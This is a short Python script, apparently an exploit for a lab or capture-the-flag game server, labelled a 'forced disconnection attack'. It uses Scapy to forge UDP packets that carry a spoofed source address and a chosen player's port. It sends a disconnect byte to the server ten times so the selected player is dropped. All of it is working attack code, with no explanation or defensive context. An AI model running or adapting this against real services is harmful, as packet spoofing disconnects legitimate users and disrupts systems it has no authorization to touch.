from scapy.all import *
import struct
import time

def force_disconnect(server_ip, server_port, target_port):
    payload = struct.pack('B', 0x04)
    packet = IP(src="127.0.0.1", dst=server_ip) / \
             UDP(sport=target_port, dport=server_port) / \
             Raw(load=payload)
    
    print("[*] Sending disconnection messages...")
    for i in range(10):
        send(packet, verbose=0)
        print(f"[*] Packet {i+1}/10 sent")
        time.sleep(0.1)
    
    print(f"[*] Forced disconnection of port {target_port}")

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 12345
    
    print("=== Forced disconnection attack ===")
    print("1. Disconnect Player 0 (port 33557)")
    print("2. Disconnect Player 1 (port 46669)")
    
    choice = input("Choice: ")
    
    if choice == "1":
        force_disconnect(SERVER_IP, SERVER_PORT, 33557)
    elif choice == "2":
        force_disconnect(SERVER_IP, SERVER_PORT, 46669)